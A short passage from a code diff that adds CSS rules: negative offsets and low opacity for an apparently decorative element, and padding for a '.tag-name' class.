+  right: -2rem;
+  top: -2rem;
+  opacity: 0.1;
+}
+.tag-name {
+  padding: 0 0.1rem;
+}
